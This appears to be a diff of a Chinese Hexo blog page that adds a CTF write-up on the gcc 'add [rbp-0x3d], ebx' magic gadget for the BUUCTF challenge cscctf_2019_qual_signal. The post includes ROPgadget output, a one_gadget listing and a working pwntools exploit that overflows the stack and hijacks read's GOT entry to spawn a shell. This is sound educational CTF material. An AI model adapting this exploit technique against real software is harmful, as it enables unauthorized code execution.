@@ -6,17 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>分类 | 辰祈w</title>
+  <title>magic gadget | 辰祈w</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="分类">
-<meta property="og:url" content="http://yoursite.com/categories/index.html">
+  <meta name="description" content="magic gadget在做题的时候遇到了这个神奇的gadget，大佬们说这是gcc编译自带的，我觉得这个gadget也十分有趣，就打算记下来。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="magic gadget">
+<meta property="og:url" content="http://yoursite.com/2021/01/15/magic%20gadget/index.html">
 <meta property="og:site_name" content="辰祈w">
+<meta property="og:description" content="magic gadget在做题的时候遇到了这个神奇的gadget，大佬们说这是gcc编译自带的，我觉得这个gadget也十分有趣，就打算记下来。">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-03-24T14:13:22.000Z">
-<meta property="article:modified_time" content="2020-03-24T14:15:51.089Z">
+<meta property="article:published_time" content="2021-01-15T09:42:05.564Z">
+<meta property="article:modified_time" content="2021-01-15T09:43:18.696Z">
 <meta property="article:author" content="Chenqiw">
 <meta name="twitter:card" content="summary">
   
@@ -185,14 +187,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-magic gadget" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      分类
+      magic gadget
     </h1>
   
 
@@ -204,8 +206,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/categories/index.html" class="archive-article-date">
-        <time datetime="2020-03-24T14:13:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-24</time>
+<a href="/2021/01/15/magic%20gadget/" class="archive-article-date">
+        <time datetime="2021-01-15T09:42:05.564Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-15</time>
 </a>
 
   
@@ -218,7 +220,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">0字</span>
+      <span class="post-count">596字</span>
     </span>
   </span>
 
@@ -227,7 +229,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">2分</span>
     </span>
   </span>
 </div>
@@ -238,7 +240,31 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    
+    <h1 id="magic-gadget"><a href="#magic-gadget" class="headerlink" title="magic gadget"></a>magic gadget</h1><p>在做题的时候遇到了这个神奇的gadget，大佬们说这是gcc编译自带的，我觉得这个gadget也十分有趣，就打算记下来。</p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add     [rbp<span class="number">-3</span>Dh], ebx</span><br></pre></td></tr></table></figure>
+
+<p>这样的一个小gadget就非常神奇，这个gadget基本出现在__do_global_dtors_au这个函数里面，然而一般ida打开，点开这个函数但是看不到这个gadget，原因是因为这个gadget是通过错位得到的。一般可以通过ROPgadget来搜索得到，原谅我不会调ida。一些题目就是利用这个gadget可以不需要leak libc，这一个gadget的含义就是往 [rbp-3Dh]这个上面加一个值，那么只要在程序某个确定的地址保存有动态链接的地址,且此处具有可写权限,则可以将这里修改为rce的地址或者system的地址，那么具体是怎么实现的呢，这里我就拿buu上面的一个题目来演示一下。</p>
+<h2 id="qual-signal"><a href="#qual-signal" class="headerlink" title="qual_signal"></a>qual_signal</h2><p>这个题目就是利用了这个考点来做，首先通过搜索</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chen@ubuntu:~/pwn/buuctf/cscctf_2019_qual_signal$ ROPgadget --binary cscctf_2019_qual_signal| grep ret | grep <span class="string">"\[rbp"</span> </span><br><span class="line"><span class="number">0x0000000000400618</span> : add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line"><span class="number">0x00000000004006dc</span> : mov eax, dword ptr [rbp - <span class="number">0x108</span>] ; leave ; ret</span><br><span class="line"><span class="number">0x00000000004006db</span> : mov rax, qword ptr [rbp - <span class="number">0x108</span>] ; leave ; ret</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到里面就有我们需要的gadget，</p>
+<p>在通过搜寻寻找og</p>
+<p>通过在ROPgadget后面加l2条件来找到更多的og，于是就发现了下面这个og，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xe569f</span> execve(<span class="string">"/bin/sh"</span>, r14, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r14] == <span class="literal">NULL</span> || r14 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为程序里面我们可以找到这样一段gadget</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040074</span>A                 pop     rbx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040074B</span>                 pop     rbp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040074</span>C                 pop     r12</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040074</span>E                 pop     r13</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400750</span>                 pop     r14</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400752</span>                 pop     r15</span><br></pre></td></tr></table></figure>
+
+<p>这一段就可以控制我们所要控制的所有寄存器</p>
+<p>exp如下</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">p = process(<span class="string">'./cscctf_2019_qual_signal'</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x108</span></span><br><span class="line">payload += p64(<span class="number">0x40074a</span>) </span><br><span class="line">og = <span class="number">0xe569f</span> - <span class="number">0x110070</span></span><br><span class="line">payload += p64(og &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0x601020</span> + <span class="number">0x3d</span>)  </span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">8</span> * <span class="number">4</span>  </span><br><span class="line">payload += p64(<span class="number">0x400618</span>) </span><br><span class="line">payload += p64(<span class="number">0x400530</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中og &amp; 0xffffffffffffffff可以利用这样的方式来表示负数<br>因为我们控制rbp为0x601020 + 0x3d#read_got+0x3d,那么dword ptr [rbp - 0x3d]这上面的地址就是read_got上面的地址，通过调试计算得dword ptr [rbp - 0x3d] = libc+110070，那么加上多少才是og呢，这里就用og = 0xe569f - 0x110070再进行og &amp; 0xffffffffffffffff，这样把这个数加上去就是libc+og的值，这样就劫持read的got表。</p>
+
     
 
     
@@ -252,7 +278,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://yoursite.com/categories/index.html" title="分类" target="_blank">http://yoursite.com/categories/index.html</a>
+          <a href="http://yoursite.com/2021/01/15/magic gadget/" title="magic gadget" target="_blank">http://yoursite.com/2021/01/15/magic gadget/</a>
         </li>
         
         <li>
@@ -319,7 +345,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/categories/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/01/15/magic%20gadget/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -331,6 +357,16 @@
   </div>
 </article>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2020/12/08/%E6%A0%88%E8%BF%81%E7%A7%BB%E8%AF%A6%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">栈迁移详解</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
 
 <aside class="wrap-side-operation">
@@ -400,7 +436,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
